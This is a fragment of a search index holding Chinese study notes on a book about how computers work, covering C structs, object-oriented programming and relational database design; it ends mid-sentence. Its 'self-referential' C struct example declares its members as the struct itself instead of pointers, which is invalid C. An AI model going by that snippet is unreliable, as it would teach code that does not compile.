<p>\u8fd9\u91cc\u4ee5C\u8bed\u8a00\u4e3a\u4f8b\uff0c\u5728\u57fa\u672c\u7684\u6570\u636e\u7ed3\u6784\u5916\uff0c\u4f7f\u7528\u4e86\u7ed3\u6784\u4f53\u6570\u636e\u7ed3\u6784\uff0c\u8bbe\u7f6e\u7ed3\u6784\u4f53\u7684\u67d0\u4e2a\u5c5e\u6027\u662f\u6307\u9488\uff0c\u6307\u5411\u53e6\u4e00\u4e2a\u7ed3\u6784\u4f53\uff08\u7c7b\u4f3c\u5bf9\u8c61\u5f15\u7528\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff09\u3002\u8fd9\u6837\u5b9e\u73b0\u4e86\u94fe\u8868\uff0c\u5806\u6808\uff0c\u4e8c\u53c9\u6811\u7b49\u590d\u6742\u7684\u6570\u636e\u7ed3\u6784\u3002\u5728\u5176\u4ed6\u7684\u6570\u636e\u7ed3\u6784\u548c\u7b97\u6cd5\u6570\u636e\u4e2d\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u6240\u4ee5\u4e0d\u8d58\u8ff0\u3002</p> <pre><code>// \u8fd9\u662f\u81ea\u6211\u5f15\u7528\u7684\u7ed3\u6784\u4f53\nstruct TestResult {\n  char Chinese;\n  char Math;\n  char English;\n  struct TestResult Pointer1;\n  struct TestResult Pointer2;\n};\n</code></pre>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#7","title":"\u7b2c7\u7ae0 \u6210\u4e3a\u4f1a\u4f7f\u7528\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u7a0b\u5e8f\u5458\u5427\uff08\u9762\u5411\u5bf9\u8c61\uff09","text":"<p>\u25cf 7.1 \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b 127 \u7ae0</p> <p>\u25cf 7.2 \u5bf9OOP\u7684\u591a\u79cd\u7406\u89e3\u65b9\u6cd5 128 </p> <p>\u25cf 7.3 \u89c2\u70b9 1 :\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u901a\u8fc7\u628a\u7ec4\u4ef6\u62fc\u88c5\u5230\u4e00\u8d77\u6784\u5efa\u7a0b\u5e8f 130 </p> <p>\u25cf 7.4 \u89c2\u70b9 2 :\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u80fd\u591f\u63d0\u5347\u7a0b\u5e8f\u7684\u5f00\u53d1\u6548\u7387\u548c\u53ef\u7ef4\u62a4\u6027 132</p> <p>\u25cf 7.5 \u89c2\u70b9 3 :\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u662f\u9002\u7528\u4e8e\u5927\u578b\u7a0b\u5e8f\u7684\u5f00\u53d1\u65b9\u6cd5 </p> <p>\u25cf 7.6 \u89c2\u70b9 4 :\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u5c31\u662f\u5728\u4e3a\u73b0\u5b9e\u4e16\u754c\u5efa\u6a21</p> <p>\u25cf 7.7 \u89c2\u70b9 5 :\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u53ef\u4ee5\u501f\u52a9 UML \u8bbe\u8ba1\u7a0b\u5e8f</p> <p>\u25cf 7.8 \u89c2\u70b9 6 :\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u901a\u8fc7\u5728\u5bf9\u8c61\u95f4\u4f20\u9012\u6d88\u606f\u9a71\u52a8\u7a0b\u5e8f </p> <p>\u25cf 7.9 \u89c2\u70b9 7 :\u5728\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u4f7f\u7528\u7ee7\u627f\u3001\u5c01\u88c5\u548c\u591a\u6001 </p> <p>\u25cf 7.10 \u7c7b\u548c\u5bf9\u8c61\u7684\u533a\u522b</p> <p>\u25cf 7.11 \u7c7b\u6709\u4e09\u79cd\u4f7f\u7528\u65b9\u6cd5</p> <p>\u25cf 7.12 \u5728Java\u548c.NET\u4e2d\u6709\u5173OOP\u7684\u77e5\u8bc6\u4e0d\u80fd\u5c11</p> <p>\u8fd9\u662f2003\u5e74\u7684\u4e66\uff0c\u8ddd\u4eca\u5df2\u7ecf20\u5e74\u4e86\uff0c\u6240\u4ee5\u5f53\u65f6\u9762\u5411\u5bf9\u8c61\u8fd8\u4e0d\u662f\u4e3b\u6d41\u7f16\u7a0b\u65b9\u6848\uff0c\u4e3b\u8981\u7684OOB\u8bed\u8a00\u8fd8\u662f C++ Java c# \u73b0\u5728\u9762\u5411\u5bf9\u8c61\u5df2\u7ecf\u5360\u636e\u5f88\u5927\u7684\u5e02\u573a\u4efd\u989d\u4e86\u3002\u5ba2\u89c2\u7684\u8bf4\uff0c\u65b0\u6280\u672f\u6bd4\u8f83\u96be\uff0c\u786e\u5b9e\u4f1a\u53d6\u4ee3\u5f88\u591a\u65e7\u7684\u6280\u672f\u3002\u5982\u679c\u73b0\u5728\u53ea\u4f1a VB \u90a3\u4e48\u4e00\u5b9a\u4f1a\u88ab\u6dd8\u6c70\u3002</p> <p>\u5728 OOB \u4e2d\u624d\u6709\u5bf9\u8c61\u7684\u6982\u5ff5\uff0c\u5c31\u66ff\u4ee3\u4e86 C \u4e2d\u7684\u7ed3\u6784\u4f53\u3002\u7ed3\u6784\u4f53\u662f\u5355\u7eaf\u7684\u6570\u636e\u7684\u96c6\u5408\uff0c\u64cd\u4f5c\u6570\u636e\u7684\u65b9\u6cd5\u8fd8\u5728\u7ed3\u6784\u4f53\u5916\u90e8\uff0c\u4ee5\u5355\u72ec\u7684\u51fd\u6570\u5b58\u5728\u3002\u5728\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\uff0c\u5bf9\u8c61\u5185\u90e8\u5305\u62ec\u4e86\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u96c6\u6210\u4e86\u6570\u636e\u548c\u64cd\u4f5c\u6570\u636e\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u52a0\u5f3a\u7248\u672c\u7684\u7ed3\u6784\u4f53\u3002</p> <p>\u5f00\u53d1\u5c0f\u7ec4\u4e2d\u7684\u5168\u4f53\u6210\u5458\u6ca1\u6709\u5fc5\u8981\u90fd\u5bf9\u7a0b\u5e8f\u4e2d\u7684\u65b9\u65b9\u9762\u9762\u6709\u6240\u4e86\u89e3\uff0c\u800c\u662f\u7ec4\u4e2d\u6709\u4e9b\u4eba\u53ea\u8d1f\u8d23\u5236\u4f5c\u7ec4\u4ef6\uff08\u7c7b\uff09\uff0c\u6709\u4e9b\u4eba\u53ea\u8d1f\u8d23\u4f7f\u7528\u7ec4\u4ef6\u3002</p> <p>\u73b0\u5728\u9879\u76ee\u4e2d\u5f88\u591a\u7684\u95ee\u9898\uff0c\u5c31\u662f\u7ec4\u4ef6\u590d\u7528\u4e0d\u591a\uff0c\u6216\u8005\u8bf4\u6837\u5f0f\u7c7b\u540d\u590d\u7528\u4e0d\u591a\uff0c\u5f88\u591a\u60c5\u51b5\u76f4\u63a5\u6284\u4ee3\u7801\uff0c\u9020\u6210\u4e86\u540e\u671f\u4e0d\u597d\u7ef4\u62a4\u7b49\u60c5\u51b5\u3002\u8fd9\u4e2a\u60f3\u60f3\u600e\u4e48\u89e3\u51b3\u6bd4\u8f83\u597d\u3002\u6574\u4f53\u4e0a\uff0c\u4e00\u90e8\u5206 UI \u7ec4\u4ef6\u662f\u5f00\u6e90\u7684\u5546\u4e1a\u7ec4\u4ef6\uff0c\u518d\u6b64\u57fa\u7840\u4e0a\u8fdb\u884c\u7ec6\u8282\u7684\u52a0\u5de5\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u8981\u4e00\u8fb9\u89c2\u5bdf\u4f5c\u4e3a\u7a0b\u5e8f\u53c2\u7167\u7269\u7684\u73b0\u5b9e\u4e16\u754c\uff0c\u4e00\u8fb9\u601d\u8003\u5f85\u89e3\u51b3\u7684\u95ee\u9898\u662f\u7531\u54ea\u4e9b\u4e8b\u7269\uff08\u7c7b\uff09\u6784\u6210\u7684\u3002\u4ece\u524d\u7aef\u89d2\u5ea6\u8003\u8651\uff0c\u754c\u9762\u4e0a UI \u5212\u5206\u7684\u7ec4\u4ef6\uff0c\u7136\u540e\u7406\u89e3\u7ec4\u4ef6\u5bf9\u5e94\u7684\u529f\u80fd\u548c\u5c5e\u6027\uff0c\u7136\u540e\u5bf9\u5e94\u4ee3\u7801\u5c42\u9762\u7684\u7c7b\u548c\u5185\u90e8\u51fd\u6570\u3002\u5982\u679c\u4e00\u4e2a\u7c7b\u4e0d\u660e\u786e\uff0c\u90a3\u4e48UI\u5c42\u9762\u4e0a\u5212\u5206\u7684\u5c31\u4e0d\u5408\u9002\u3002\u6216\u8005\u67d0\u4e2a\u7c7b\u6ca1\u6709\u5bf9\u5e94\u67d0\u4e2a\u5b9e\u9645\u7684 UI\uff0c\u800c\u662f\u4e00\u4e2a\u670d\u52a1\uff0c\u8fd9\u4e2a\u5c31\u5148\u8bbe\u8ba1\u597d\u600e\u4e48\u5904\u7406\u4e0d\u540c\u7684\u7c7b\u3002</p> <p>\u9762\u5411\u8fc7\u7a0b\u7f16\u7a0b\uff0c\u4f7f\u7528\u6d41\u7a0b\u56fe\u5c31\u53ef\u4ee5\uff0c\u56e0\u4e3a\u6ca1\u6709\u5177\u4f53\u6267\u884c\u51fd\u6570\u7684\u4e3b\u4f53\u3002</p> <p>\u9762\u76f8\u5bf9\u8c61\u7f16\u7a0b\uff0c\u4f7f\u7528\u65f6\u5e8f\u56fe\u5c31\u53ef\u4ee5\uff0c\u6bcf\u4e00\u4e2a\u7c7b\u6216\u8005\u5bf9\u8c61\uff0c\u90fd\u6709\u81ea\u5df1\u7684\u65b9\u6cd5\uff0c\u6216\u8005\u548c\u5176\u4ed6\u7684\u7c7b\u8fdb\u884c\u4ea4\u4e92\uff0c\u8fd9\u662f\u4e0e\u9762\u5411\u8fc7\u7a0b\u7f16\u7a0b\u7684\u6700\u5927\u533a\u522b\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#8","title":"\u7b2c8\u7ae0 \u4e00\u7528\u5c31\u4f1a\u7684\u6570\u636e\u5e93\uff08\u6570\u636e\u5e93\u6982\u8bba\uff09","text":"<p>\u25cf 8.1 \u6570\u636e\u5e93\u662f\u6570\u636e\u7684\u57fa\u5730</p> <p>\u5f00\u7bc7</p> <p>\u8868\uff08Table\uff09\u5c31\u662f\u88ab\u6574\u7406\u6210\u8868\u683c\u5f62\u5f0f\u7684\u6570\u636e\u3002\u4e00\u5f20\u8868\u7531\u82e5\u5e72\u4e2a\u5217\u548c\u884c\u6784\u6210\u3002\u5217\u4e5f\u88ab\u79f0\u4e3a\u5b57\u6bb5\uff08Field\uff09\uff0c \u884c\u4e5f\u88ab\u79f0\u4e3a\u8bb0\u5f55\uff08Record\uff09\u3002</p> <p>\u952e\u7528\u4e8e\u8bbe\u5b9a\u8868\u548c\u8868\u4e4b\u95f4\u7684\u5173\u7cfb\uff08Relationship\uff09\uff0c\u800c\u7d22\u5f15\u662f\u63d0\u5347\u6570\u636e\u68c0\u7d22\u901f\u5ea6\u7684\u673a\u5236\u3002</p> <p>\u5176\u4e0a\u6bcf\u4e2a\u503c\u90fd\u80fd\u591f\u552f\u4e00\u6807\u8bc6\u4e00\u6761\u8bb0\u5f55\u7684\u5b57\u6bb5\u79f0\u4e3a\u4e3b\u952e\u3002\u4e3a\u4e86\u5728\u8868\u548c\u8868\u4e4b\u95f4\u5efa\u7acb\u5173\u7cfb\u800c\u5728\u8868\u4e2d\u6dfb\u52a0\u7684\u3001\u5176\u4ed6\u8868\u4e3b\u952e\u7684\u5b57\u6bb5\u79f0\u4e3a\u5916\u952e\u3002\u800c\u7d22\u5f15\u662f\u4e0e\u952e\u65e0\u5173\u7684\u673a\u5236\u3002</p> <p>\u5361\u7247\u578b\u6570\u636e\u5e93\uff1a\u5c06\u8fd9\u6837\u7684\u6570\u636e\u5b58\u50a8\u5f62\u5f0f\u539f\u5c01\u4e0d\u52a8\u5730\u79fb\u690d\u5230\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c31\u5f62\u6210\u4e86\u201c\u5361\u7247\u578b\u6570\u636e\u5e93\u201d\u3002\u5b58\u50a8\u4e00\u6761\u6570\u636e\u5c31\u597d\u6bd4\u628a\u4e00\u5f20\u8d26\u5355\u6216\u662f\u540d\u7247\u4e0a\u7684\u4fe1\u606f\u8bb0\u5f55\u5230\u4e00\u4e2a\u6587\u4ef6\u4e2d\u3002</p> <p>\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff1a\u9002\u5408\u5b58\u50a8\u5927\u89c4\u6a21\u6570\u636e\u7684\u662f\u5173\u7cfb\u578b\u6570\u636e\u5e93\u3002\u5728\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e2d\uff0c\u6570\u636e\u88ab\u62c6\u5206\u6574\u7406\u5230\u591a\u5f20\u8868\u4e2d\uff0c\u540c\u65f6\u8868\u4e0e\u8868\u4e4b\u95f4\u7684\u5173\u7cfb\u4e5f\u53ef\u4ee5\u88ab\u8bb0\u5f55\u4e0b\u6765\u3002</p> <p>\u25cf 8.2 \u6570\u636e\u6587\u4ef6\u3001DBMS\u548c\u6570\u636e\u5e93\u5e94\u7528\u7a0b\u5e8f </p> <p>\u6570\u636e\u5e93\u7cfb\u7edf\u7684\u6784\u6210\u8981\u7d20\u5305\u62ec\u201c\u6570\u636e\u6587 \u4ef6\u201d\u201cDBMS\u201d\u201c\u5e94\u7528\u7a0b\u5e8f\u201d\u4e09\u90e8\u5206\u3002\u5728\u5c0f\u578b\u7cfb\u7edf\u4e2d\uff0c\u628a\u4e09\u4e2a\u8981\u7d20\u5168\u90e8\u90e8 \u7f72\u5728\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u79f0\u4f5c\u201c\u72ec\u7acb\u578b\u7cfb\u7edf\u201d\u3002\u5728\u4e2d\u578b\u7cfb\u7edf\u4e2d\uff0c\u628a\u6570\u636e\u6587\u4ef6 \u90e8\u7f72\u5728\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\uff0c\u5e76\u4e14\u4f7f\u6570\u636e\u6587\u4ef6\u88ab\u90e8\u7f72\u4e86 DBMS \u548c\u5e94\u7528\u7a0b\u5e8f \u7684\u591a\u53f0\u8ba1\u7b97\u673a\u5171\u4eab\uff0c\u8fd9\u6837\u7684\u7cfb\u7edf\u88ab\u79f0\u4e3a\u201c\u6587\u4ef6\u5171\u4eab\u578b\u7cfb\u7edf\u201d\u3002\u5728\u5927\u578b \u7cfb\u7edf\u4e2d\uff0c\u628a\u6570\u636e\u6587\u4ef6\u548c DBMS \u90e8\u7f72\u5728\u4e00\u53f0\uff08\u6216\u8005\u591a\u53f0\uff09\u8ba1\u7b97\u673a\u4e0a\uff0c\u7136 \u540e\u7528\u6237\u4ece\u53e6\u5916\u4e00\u4e9b\u90e8\u7f72\u7740\u5e94\u7528\u7a0b\u5e8f\u7684\u8ba1\u7b97\u673a\u4e0a\u8bbf\u95ee\uff0c\u8fd9\u6837\u7684\u7cfb\u7edf\u88ab\u79f0 \u4f5c\u201c\u5ba2\u6237\u7aef\uff0f\u670d\u52a1\u5668\u578b\u7cfb\u7edf\u201d\u3002\u5176\u4e2d\u90e8\u7f72\u7740\u6570\u636e\u6587\u4ef6\u548c DBMS \u7684\u8ba1\u7b97 \u673a\u662f\u670d\u52a1\u5668\uff08Server\uff09\uff0c\u5373\u670d\u52a1\u7684\u63d0\u4f9b\u8005\uff1b\u90e8\u7f72\u7740\u5e94\u7528\u7a0b\u5e8f\u7684\u8ba1\u7b97\u673a\u662f \u5ba2\u6237\u7aef\uff08Client\uff09\uff0c\u5373\u670d\u52a1\u7684\u4f7f\u7528\u8005\u3002\u5982\u679c\u628a\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u4e4b\u95f4\u7528\u4e92\u8054\u7f51\u8054\u7ed3\u8d77\u6765\uff0c\u5c31\u5f62\u6210\u4e86 Web \u7cfb\u7edf\u3002\u5728 Web \u7cfb\u7edf\u4e2d\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u5e94 \u7528\u7a0b\u5e8f\u4e5f\u662f\u90e8\u7f72\u5728\u670d\u52a1\u5668\u4e2d\u7684\uff0c\u5728\u5ba2\u6237\u7aef\u53ea\u90e8\u7f72 Web \u6d4f\u89c8\u5668\uff08\u5982\u56fe 8.4 \u6240\u793a\uff09</p> <p>\u25cf 8.3 \u8bbe\u8ba1\u6570\u636e\u5e93</p> <p>\u8bbe\u8ba1\u6570\u636e\u5e93\u7684\u7b2c\u4e00\u6b65\u662f\u4ece\u201c\u4f60\u60f3\u8981\u4e86\u89e3\u4ec0\u4e48\u201d\u7684\u89c6\u89d2\u51fa\u53d1\u627e\u51fa\u9700\u8981\u7684\u6570\u636e\u3002</p> <p>\u9152\u94fa\u7ecf\u8425\u8005\u9700\u8981\u77e5\u9053\u4ec0\u4e48\uff1f \u25cf \u5546\u54c1\u540d\u79f0 \u25cf \u5355\u4ef7\uff08\u65e5\u5143\uff09 \u25cf \u9500\u552e\u91cf \u25cf \u987e\u5ba2\u59d3\u540d \u25cf \u4f4f\u5740 \u25cf \u7535\u8bdd\u53f7\u7801</p> <p>\u628a\u5fc5\u8981\u7684\u6570\u636e\u7b5b\u9009\u51fa\u6765\u4ee5\u540e\uff0c\u4e0b\u4e00\u6b65\u8981\u8003\u8651\u7684\u662f\u5404\u79cd\u6570\u636e\u7684\u5c5e\u6027\u3002 \u5c5e\u6027\u4e5f\u79f0\u4f5c\u6a21\u5f0f\uff08\u5185\u6a21\u5f0f\uff09\uff0c\u5177\u4f53\u6765\u8bf4\u5c31\u662f\u6570\u636e\u7684\u7c7b\u578b\uff08\u662f\u6570\u5b57\u8fd8\u662f\u5b57 \u7b26\u4e32\uff09\uff0c\u6570\u5b57\u7684\u8bdd\u662f\u6574\u6570\u8fd8\u662f\u6d6e\u70b9\u5c0f\u6570\uff0c\u5b57\u7b26\u4e32\u7684\u8bdd\u6700\u591a\u5141\u8bb8\u5305\u542b\u591a\u5c11 \u4e2a\u5b57\u7b26\uff0c\u662f\u5426\u5141\u8bb8 NULL \u503c\uff08\u8868\u793a\u672a\u77e5\u6216\u8005\u4e0d\u5b58\u5728\u7684\u503c\uff09\uff0c\u7b49\u7b49\u3002</p> <p>\u5728\u5173\u7cfb\u578b\u6570\u636e\u5e93\u4e2d\uff0c\u628a\u5f55\u5165 \u5230\u8868\u4e2d\u7684\u6bcf\u4e00\u884c\u6570\u636e\u90fd\u79f0\u4e3a\u8bb0\u5f55\uff0c\u628a\u6784\u6210\u4e00\u6761\u8bb0\u5f55\u4e2d\u7684\u5404\u4e2a\u6570\u636e\u9879\uff08\u5728 \u672c\u4f8b\u4e2d\u662f\u5546\u54c1\u540d\u79f0\u3001\u5355\u4ef7\u7b49\uff09\u6240\u5728\u7684\u5217\u90fd\u79f0\u4f5c\u5b57\u6bb5\u3002\u8bb0\u5f55\u6709\u65f6\u4e5f\u88ab\u79f0\u4e3a \u884c\u6216\u5143\u7ec4\uff08Tuple\uff09\uff0c\u5b57\u6bb5\u6709\u65f6\u4e5f\u88ab\u79f0\u4e3a\u5217\u6216\u5c5e\u6027\uff08Attribute\uff09\u3002</p> <p>\u25cf 8.4 \u901a\u8fc7\u62c6\u8868\u548c\u6574\u7406\u6570\u636e\u5b9e\u73b0\u89c4\u8303\u5316</p> <p>\u5728\u8bbe\u8ba1\u5173\u7cfb\u578b\u6570\u636e\u5e93\u65f6\uff0c\u8fd8\u8981\u8fdb\u884c\u201c\u89c4\u8303\u5316\u201d\u3002 \u6240\u8c13\u89c4\u8303\u5316\uff0c\u5c31\u662f\u5c06\u4e00\u5f20\u5927\u8868\u5206\u5272\u6210\u591a\u5f20\u5c0f\u8868\uff0c\u7136\u540e\u518d\u5728\u5c0f\u8868\u4e4b\u95f4\u5efa \u7acb\u5173\u7cfb\uff0c\u4ee5\u6b64\u6765\u8fbe\u5230\u6574\u7406\u6570\u636e\u5e93\u7ed3\u6784\u7684\u76ee\u7684\u3002\u901a\u8fc7\u89c4\u8303\u5316\uff0c\u53ef\u4ee5\u5f62\u6210\u7ed3\u6784\u66f4\u52a0\u4f18\u826f\u7684\u6570\u636e\u5e93\u3002</p> <p>\u89c4\u8303\u5316\u7684\u8981\u70b9\u662f\u5728\u4e00\u4e2a\u6570\u636e\u5e93\u4e2d\u8981\u907f\u514d\u91cd\u590d\u5b58\u50a8\u76f8\u540c\u7684\u6570\u636e\u3002\u56e0 \u6b64\u5728\u672c\u4f8b\u4e2d\uff0c\u628a\u9152\u94fa\u7684\u6570\u636e\u5e93\u5206\u4e3a\u201c\u5546\u54c1\u8868\u201d\u201c\u987e\u5ba2\u8868\u201d\u548c\u201c\u9500\u552e\u8bb0\u5f55 \u8868\u201d\u4e09\u5f20\u8868\uff0c\u7136\u540e\u518d\u5728\u5b83\u4eec\u4e4b\u95f4\u5efa\u7acb\u5173\u7cfb</p> <p>\u901a\u8fc7\u8fd9\u6837\u7684\u5904\u7406\uff0c\u65e2\u7701\u53bb\u4e86\u591a\u6b21\u91cd\u590d\u5f55\u5165\u76f8\u540c\u7684\u987e\u5ba2\u59d3\u540d\u3001\u4f4f \u5740\u3001\u7535\u8bdd\u53f7\u7801\u7684\u9ebb\u70e6\uff0c\u53c8\u80fd\u9632\u6b62\u628a\u76f8\u540c\u7684\u5546\u54c1\u540d\u79f0\u8f93\u5165\u6210\u4e0d\u540c\u540d\u79f0\u7684 \u9519\u8bef\u3002</p> <p>\u25cf 8.5 \u7528\u4e3b\u952e\u548c\u5916\u952e\u5728\u8868\u95f4\u5efa\u7acb\u5173\u7cfb 159 </p> <p>\u9996\u5148\u8981\u5728\u5404\u4e2a\u8868\u4e2d\u6dfb\u52a0 \u4e00\u4e2a\u540d\u4e3a\u4e3b\u952e\uff08Primary Key\uff09\u7684\u5b57\u6bb5\uff0c\u8be5\u5b57\u6bb5\u7684\u503c\u80fd\u591f\u552f\u4e00\u5730\u6807\u8bc6\u8868\u4e2d \u7684\u4e00\u6761\u8bb0\u5f55\uff08\u5982\u56fe 8.9 \u6240\u793a\uff09\u3002\u5728\u987e\u5ba2\u8868\u4e2d\u6dfb\u52a0\u7684\u201c\u987e\u5ba2 ID\u201d\u5b57\u6bb5\uff0c\u5728 \u9500\u552e\u8bb0\u5f55\u8868\u4e2d\u6dfb\u52a0\u7684\u201c\u9500\u552e\u8bb0\u5f55 ID\u201d\u5b57\u6bb5\u4ee5\u53ca\u5728\u5546\u54c1\u8868\u4e2d\u6dfb\u52a0\u7684\u201c\u5546\u54c1 ID\u201d\u5b57\u6bb5\uff0c\u90fd\u662f\u4e3b\u952e\u3002</p> <p>\u8868\u4e4b\u95f4\u7684\u5173\u7cfb\u4f7f\u8bb0\u5f55\u548c\u8bb0\u5f55\u5173\u8054\u4e86\u8d77\u6765\u3002\u8bb0\u5f55\u4e4b\u95f4\u867d\u7136\u5728\u903b\u8f91\u4e0a \u6709\u4e00\u5bf9\u4e00\u3001\u591a\u5bf9\u591a\u4ee5\u53ca\u4e00\u5bf9\u591a\uff08\u7b49\u540c\u4e8e\u591a\u5bf9\u4e00\uff09\u4e09\u79cd\u5173\u7cfb\uff0c\u4f46\u662f\u5728\u5173\u7cfb \u578b\u6570\u636e\u5e93\u4e2d\u65e0\u6cd5\u76f4\u63a5\u8868\u793a\u591a\u5bf9\u591a\u5173\u7cfb\u3002</p> <p>\u5f53\u51fa\u73b0\u591a\u5bf9\u591a\u5173\u7cfb\u65f6\uff08\u7528\u6237\u8868\u548c\u5546\u54c1\u8868\uff0c\u53ef\u80fd\u5b58\u5728\u591a\u5bf9\u591a\u7684\u5173\u7cfb\uff09\uff0c\u53ef\u4ee5\u5728\u8fd9\u4e24\u5f20\u8868\u4e4b\u95f4\u518d\u52a0\u5165\u4e00\u5f20\u8868\uff0c\u628a\u591a \u5bf9\u591a\u5173\u7cfb\u5206\u89e3\u6210\u4e24\u4e2a\u4e00\u5bf9\u591a\u5173\u7cfb\uff08\u5982\u56fe 8.10 \u6240\u793a\uff09\u3002\u52a0\u5165\u7684\u8fd9\u5f20\u8868\u88ab\u79f0 \u4f5c\u8fde\u63a5\u8868\uff08Link Table\uff09\uff08\u9500\u552e\u8bb0\u5f55\u8868\uff0c\u6211\u4eec\u8ba4\u4e3a\u4e00\u6761\u9500\u552e\u8bb0\u5f55\u5bf9\u5e94\u4e00\u4e2a\u7528\u6237\u548c\u4e00\u4e2a\u5546\u54c1\uff0c\u4e00\u4e2a\u7528\u6237\u53ef\u4ee5\u6709\u591a\u6761\u9500\u552e\u8bb0\u5f55\uff0c\u4e00\u4e2a\u5546\u54c1\u4e5f\u80fd\u5bf9\u5e94\u591a\u4e2a\u9500\u552e\u8bb0\u5f55\uff09\u3002</p> <p>\u5982\u679c\u662f\u81ea\u5df1\u7684\u9879\u76ee\uff0c\u90a3\u4e48\u6bcf\u4e00\u4e2a\u4eba\u53ef\u4ee5\u8d2d\u4e70\u591a\u4e2a\u4e66\u7c4d\uff0c\u6bcf\u4e00\u4e2a\u4e66\u7c4d\u53ef\u80fd\u7531\u4e0d\u540c\u7684\u4eba\u8d2d\u4e70\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u662f\u7c7b\u4f3c\u7684\u4e66\u7c4d\u9500\u552e\u8bb0\u5f55\u8868\uff0c\u5904\u7406\u591a\u5bf9\u591a\u7684\u8054\u7cfb\u3002</p> <p>\u8fd8\u9700\u8981\u5904\u7406\u67d0\u4e00\u6761\u6570\u636e\u5220\u9664\u7684\u60c5\u51b5\uff1a\u5982\u679c\u67d0\u4e2a\u4e66\u7c4d\u4ece\u6570\u636e\u5e93\u5185\u90e8\u5220\u9664\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u9500\u552e\u8bb0\u5f55\u600e\u4e48\u5904\u7406\uff1f\u2014\u2014\u5220\u9664\u4e66\u7c4d\u65f6\uff0c\u5e94\u8be5\u5355\u72ec\u8bbe\u7f6e\u4e00\u4e2a\u5b57\u6bb5 deleted \u4f7f\u7528\u5e03\u5c14\u503c\u4f5c\u4e3a\u6807\u8bc6\uff0c\u5220\u9664\u4e66\u7c4d\u5bf9\u5e94\u7684\u6587\u672c\u5185\u5bb9\uff0c\u4fdd\u7559\u57fa\u672c\u7684\u4fe1\u606f\uff08\u4e66\u7c4d\u4fe1\u606f\uff09\u7136\u540e\u5728\u7528\u6237\u7684\u8d2d\u4e70\u8bb0\u5f55\u4e2d\uff0c\u663e\u793a\u4e66\u7c4d\uff08\u5df2\u8fc7\u671f\uff0c\u6216\u8005\u5df2\u5220\u9664\uff09\u8fd9\u6837\u6bd4\u8f83\u597d</p> <p>\u76ee\u524d\u4e66\u7c4d\u5bf9\u5e94\u7684\u6587\u672c\u5185\u5bb9\uff0c\u8fd8\u662f\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u5b58\u653e\u5728\u6570\u636e\u5e93\u4e2d\u3002\u5b9e\u9645\u4e0a\u8fd9\u4e2a\u67e5\u8868\u6027\u80fd\u6bd4\u8f83\u5dee\uff0c\u6700\u597d\u5355\u72ec\u7528\u4e00\u4e2a\u6570\u636e\u5e93\u8868\u5b58\u653e\u5bf9\u5e94\u7684\u6587\u672c\u5185\u5bb9\uff0c\u8fd9\u4e2a\u9700\u8981\u8c03\u7814\uff0c\u7c7b\u4f3c\u7684\u5176\u4ed6\u591a\u5a92\u4f53\uff0c\u600e\u6837\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\uff0c\u4e5f\u662f\u7c7b\u4f3c\u7684\u95ee\u9898\u3002</p> <p>\u25cf 8.6 \u7d22\u5f15\u80fd\u591f\u63d0\u5347\u6570\u636e\u7684\u68c0\u7d22\u901f\u5ea6 162 </p> <p>\u53ef\u4ee5\u5728\u8868\u7684\u5404\u4e2a\u5b57\u6bb5\u4e0a\u8bbe\u7f6e\u7d22\u5f15\uff08Index\uff09\uff0c\u8fd9\u4e5f\u662f DBMS \u6240\u5177\u5907 \u7684\u529f\u80fd\u4e4b\u4e00\u3002\u867d\u7136\u7d22\u5f15\u548c\u952e\u8fd9\u4e24\u4e2a\u6982\u5ff5\u5bb9\u6613\u8ba9\u4eba\u6df7\u6dc6\uff0c\u4f46\u5176\u5b9e\u4e24\u8005\u662f \u5b8c\u5168\u4e0d\u540c\u7684\u3002\u7d22\u5f15\u4ec5\u4ec5\u662f\u63d0\u5347\u6570\u636e\u68c0\u7d22\u548c\u6392\u5e8f\u901f\u5ea6\u7684\u5185\u90e8\u673a\u5236\u3002\u4e00\u65e6 \u5728\u5b57\u6bb5\u4e0a\u8bbe\u7f6e\u4e86\u7d22\u5f15\uff0cDBMS \u5c31\u4f1a\u81ea\u52a8\u4e3a\u8fd9\u4e2a\u5b57\u6bb5\u521b\u5efa\u7d22\u5f15\u8868</p> <p>\u8868\u4e2d\u6709\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u5b58\u50a8\u7740\u987e \u5ba2\u59d3\u540d\u548c\u4f4d\u7f6e\uff08\u6240\u5bf9\u5e94\u7684\u8bb0\u5f55\u5728\u6570\u636e\u6587\u4ef6\u4e2d\u7684\u4f4d\u7f6e\uff09\u3002\u4e0e\u539f\u6765\u7684\u987e\u5ba2\u8868 